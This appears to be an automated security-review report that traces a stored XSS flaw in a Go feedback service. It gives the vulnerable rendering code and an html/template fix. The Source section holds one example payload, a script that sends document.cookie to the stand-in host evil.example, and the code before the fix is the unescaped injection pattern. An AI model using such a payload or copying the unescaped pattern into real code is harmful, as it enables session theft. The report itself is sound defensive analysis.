## Verdict

exploitable (confidence: high)

- cwe_id: CWE-79
- location: `comment_view.go`, line 24 (sink), `Render` method
- confidence rationale: full source-to-sink path is present in the four provided files with no encoding or sanitization step anywhere along it.

## Source

`SubmitFeedbackHandler` in `feedback_handler.go` reads two attacker-controlled form fields directly from the HTTP request:

- `r.FormValue("author")` -> `FeedbackRequest.Author`
- `r.FormValue("message")` -> `FeedbackRequest.Message`

Data flow to the sink:

1. `feedback_handler.go`: `FeedbackRequest{Author, Message}` is built from `r.FormValue(...)` and passed to `FeedbackService.HandleSubmission`.
2. `feedback_service.go`: `HandleSubmission` copies both fields verbatim into a `Comment{Author, Message}`, logs `Author` (safe - `log.Printf` is not an HTML sink), then passes the `Comment` to `CommentFormatter.PrepareForDisplay`.
3. `comment_formatter.go`: `PrepareForDisplay` only trims whitespace and truncates length for `Author`, and derives `Excerpt` from `Message` via `summarize` (trim + truncate). Neither operation performs HTML encoding - the file's own doc comment confirms this ("Neither step encodes the text for HTML output"). Both `Author` and `Excerpt` remain attacker-controlled.
4. `comment_view.go`: `Render` builds an HTML fragment with `fmt.Sprintf("<div class=\"comment\"><h3>%s says:</h3><p>%s</p></div>", c.Author, c.Excerpt)` - a raw string interpolation with no escaping - and writes it directly to the `http.ResponseWriter` via `v.w.Write([]byte(html))` at line 24, with `Content-Type: text/html`.

Sink contract before the fix: `v.w.Write([]byte(html))` returns `(int, error)`; the byte count is discarded and the `error` is returned to the caller. No other side effects.

Both `Author` and `Excerpt` reach the sink unescaped, so a payload such as `author=<script>document.location='//evil.example/c?'+document.cookie</script>` in the submitted form renders and executes in the victim's browser when the support page is viewed - stored/reflected XSS depending on how the feedback endpoint's response is displayed.

## Fix

Vulnerable code (`comment_view.go`):

```go
package feedback

import (
	"fmt"
	"net/http"
)

type CommentView struct {
	w http.ResponseWriter
}

func NewCommentView(w http.ResponseWriter) *CommentView {
	return &CommentView{w: w}
}

func (v *CommentView) Render(c Comment) error {
	v.w.Header().Set("Content-Type", "text/html; charset=utf-8")
	html := fmt.Sprintf("<div class=\"comment\"><h3>%s says:</h3><p>%s</p></div>", c.Author, c.Excerpt)
	// SAST FINDING: CWE-79 reported here. Sink is the next statement.
	_, err := v.w.Write([]byte(html))
	return err
}
```

Fixed code (`comment_view.go`):

```go
package feedback

import (
	"html/template"
	"net/http"
)

// CommentView renders a prepared Comment into the HTML fragment returned by
// the support widget's feedback endpoint.
type CommentView struct {
	w http.ResponseWriter
}

func NewCommentView(w http.ResponseWriter) *CommentView {
	return &CommentView{w: w}
}

// commentTemplate is parsed once at package init; html/template applies
// context-aware escaping to every field substituted into it, so Author and
// Excerpt no longer need manual encoding before rendering.
var commentTemplate = template.Must(template.New("comment").Parse(
	`<div class="comment"><h3>{{.Author}} says:</h3><p>{{.Excerpt}}</p></div>`,
))

// Render writes the comment's author and excerpt into an HTML snippet that
// is appended below the feedback form on the support page.
func (v *CommentView) Render(c Comment) error {
	v.w.Header().Set("Content-Type", "text/html; charset=utf-8")
	return commentTemplate.Execute(v.w, c)
}
```

## Explanation

The sink was string concatenation (`fmt.Sprintf`) followed by a raw `w.Write`, which is exactly the pattern the Go-specific guidance identifies as a `w.Write()` with concatenated HTML taint sink - it never encodes its arguments, so any HTML metacharacters in `c.Author` or `c.Excerpt` pass straight into the response body. The fix replaces the concatenation with a parsed `html/template` template executed directly against the `Comment` struct. `html/template` performs context-aware escaping for every `{{.Field}}` substitution based on where it appears in the markup (here, HTML body text inside `<h3>` and `<p>`), so `<`, `>`, `&`, `"`, and `'` in `Author` or `Excerpt` are converted to their HTML entity equivalents and rendered inert rather than being parsed as markup. The template is parsed once at package initialization (`template.Must`, evaluated at package load) rather than on every call, which is both the idiomatic pattern and avoids a repeated parse cost per request. No validation or allowlist step is needed here since the fix is output encoding at the rendering sink, which the loaded guidance treats as the primary defense for this class of finding.

## Behaviour changes

- **Return value / failure behaviour**: the original returned the `error` from `v.w.Write` directly; the fix returns the `error` from `commentTemplate.Execute`, which itself calls `Write` on the same `http.ResponseWriter` internally and surfaces any write failure through its own returned error. Callers only branch on `err != nil` (see `HandleSubmission`), so this is behaviourally equivalent for this codebase.
- **Rendered output for content containing HTML metacharacters**: a comment author or message containing `<`, `>`, `&`, `"`, or `'` now renders as HTML-escaped text (e.g. `&lt;`) instead of being interpreted as markup/script. This is the intended effect of the fix, not an incidental change - legitimate content without those characters renders identically to before.
- Everything else - the `Content-Type` header set before rendering, the fields consumed (`Author`, `Excerpt`), the discarded byte count, and the surrounding call chain (`HandleSubmission`, `PrepareForDisplay`) - is unchanged.

## Assumptions

- No SAST-provided call path/taint trace was attached, so Option B (LLM-navigated trace) was used across all four files in the case directory to establish source and sink.
- Both `Author` and `Excerpt` were treated as in-scope for the fix since both originate from unescaped form input and reach the same unescaped sink at line 24, even though the SAST finding text names only line 24 as a whole.
